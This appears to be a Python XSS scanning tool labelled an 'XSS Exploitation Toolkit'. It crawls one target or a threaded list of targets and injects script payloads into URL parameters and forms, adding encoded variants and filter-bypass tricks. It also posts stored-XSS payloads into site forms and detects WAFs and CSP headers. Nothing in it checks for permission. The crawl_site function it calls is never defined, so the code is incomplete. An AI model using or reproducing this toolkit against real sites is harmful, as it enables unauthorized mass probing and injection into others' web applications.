import requests
import threading
import random
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import re
import os
import base64

# Initialize colorama
init(autoreset=True)

# User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

xss_payloads = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<script>confirm`XSS`</script>",
    "<img src=x onerror=prompt(1)>",
    "<body onload=alert('XSS')>"
]

encoded_payloads = []
for payload in xss_payloads:
    encoded_payloads.append(payload.encode('utf-8').hex())
    encoded_payloads.append(''.join(['%{:02x}'.format(b) for b in payload.encode()]))
    encoded_payloads.append(base64.b64encode(payload.encode()).decode())

common_params = ['q', 'query', 'search', 's', 'id', 'page', 'param']

def print_banner():
    print(Fore.RED + '''
   _____  ____   ____   
  / ____||  _ \ / __ \  
 | (___  | |_) | |  | | 
  \___ \ |  _ <| |  | | 
  ____) || |_) | |__| | 
 |_____/ |____/ \____/  
''' + Fore.YELLOW + " XSS Exploitation Toolkit by Sean\n" + Style.RESET_ALL)

def log_result(message):
    with open("xss_scan_results.txt", "a") as f:
        f.write(message + "\n")

def detect_reflected_xss(url):
    for payload in xss_payloads + encoded_payloads:
        try:
            r = requests.get(url, params={"q": payload}, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
            if payload in r.text:
                result = f"[+] Reflected XSS Detected: {url} with payload: {payload}"
                print(Fore.GREEN + result)
                log_result(result)
        except:
            pass

def detect_post_xss(url):
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in xss_payloads + encoded_payloads:
                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                target_url = urljoin(url, action)
                try:
                    if method == 'post':
                        res = requests.post(target_url, data=data, timeout=10)
                    else:
                        res = requests.get(target_url, params=data, timeout=10)
                    if payload in res.text:
                        result = f"[+] POST XSS Detected in form: {target_url} with payload: {payload}"
                        print(Fore.CYAN + result)
                        log_result(result)
                except:
                    continue
    except:
        pass

def detect_dom_xss(url):
    try:
        r = requests.get(url, timeout=10)
        if re.search(r'document\\.location|location\\.hash|document\\.URL|document\\.referrer', r.text):
            result = f"[!] Potential DOM XSS detected: {url}"
            print(Fore.MAGENTA + result)
            log_result(result)
    except:
        pass

def detect_waf(url):
    try:
        r = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
        wafs = ["cloudflare", "sucuri", "akamai", "imperva"]
        for waf in wafs:
            if waf in r.text.lower():
                result = f"[!] WAF Detected ({waf}): {url}"
                print(Fore.YELLOW + result)
                log_result(result)
    except:
        pass

def parameter_discovery(url):
    for param in common_params:
        test_url = f"{url}?{param}=<script>alert(1)</script>"
        try:
            r = requests.get(test_url, timeout=10)
            if "<script>alert(1)</script>" in r.text:
                result = f"[+] Parameter {param} reflected at {url}"
                print(Fore.LIGHTBLUE_EX + result)
                log_result(result)
        except:
            continue

def xss_filter_bypass_check(url):
    tricks = [
        "<sCript>alert(1)</sCript>",
        "<scr<script>ipt>alert(1)</script>",
        "<script/src=data:,alert(1)>"
    ]
    for trick in tricks:
        try:
            r = requests.get(url, params={"q": trick}, timeout=10)
            if trick in r.text:
                result = f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}"
                print(Fore.LIGHTGREEN_EX + result)
                log_result(result)
        except:
            pass

def stored_xss_check(url):
    print(Fore.YELLOW + f"[*] Crawling {url} for stored XSS checks...")
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in xss_payloads:
                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                target_url = urljoin(url, action)
                try:
                    if method == 'post':
                        requests.post(target_url, data=data, timeout=10)
                    else:
                        requests.get(target_url, params=data, timeout=10)
                except:
                    continue
        # Check if payload appears again
        res = requests.get(url, timeout=10)
        for payload in xss_payloads:
            if payload in res.text:
                result = f"[+] Stored XSS Detected at {url} with payload: {payload}"
                print(Fore.LIGHTMAGENTA_EX + result)
                log_result(result)
    except:
        pass

def detect_csp(url):
    try:
        r = requests.get(url, timeout=10)
        csp = r.headers.get("Content-Security-Policy")
        if csp:
            result = f"[!] CSP Detected on {url}: {csp}"
            print(Fore.LIGHTRED_EX + result)
            log_result(result)
    except:
        pass

def scan_single_target():
    url = input("Enter target URL: ").strip()
    print(Fore.YELLOW + "[*] Crawling and scanning...")
    targets = [url] + crawl_site(url)
    for target in targets:
        detect_waf(target)
        detect_csp(target)
        parameter_discovery(target)
        detect_reflected_xss(target)
        detect_post_xss(target)
        detect_dom_xss(target)
        stored_xss_check(target)
        xss_filter_bypass_check(target)

def scan_mass_targets():
    path = input("Enter path to targets list: ")
    threads = []
    try:
        with open(path) as f:
            raw_targets = [line.strip() for line in f if line.strip()]
    except:
        print("[!] File not found.")
        return

    count = input("Enter number of threads: ")
    try:
        count = int(count)
    except:
        print("[!] Invalid thread count.")
        return

    def worker(target):
        targets = [target] + crawl_site(target)
        for url in targets:
            detect_waf(url)
            detect_csp(url)
            parameter_discovery(url)
            detect_reflected_xss(url)
            detect_post_xss(url)
            detect_dom_xss(url)
            stored_xss_check(url)
            xss_filter_bypass_check(url)

    for target in raw_targets:
        t = threading.Thread(target=worker, args=(target,))
        t.start()
        threads.append(t)
        if len(threads) >= count:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()

def main():
    print_banner()
    if os.path.exists("xss_scan_results.txt"):
        os.remove("xss_scan_results.txt")
    while True:
        print("\n[1] Scan Single Target")
        print("[2] Scan Mass Targets")
        print("[3] Exit")
        choice = input("Select an option: ")

        if choice == '1':
            scan_single_target()
        elif choice == '2':
            scan_mass_targets()
        elif choice == '3':
            print("Goodbye!")
            break
        else:
            print("[!] Invalid option")

if __name__ == "__main__":
    main()
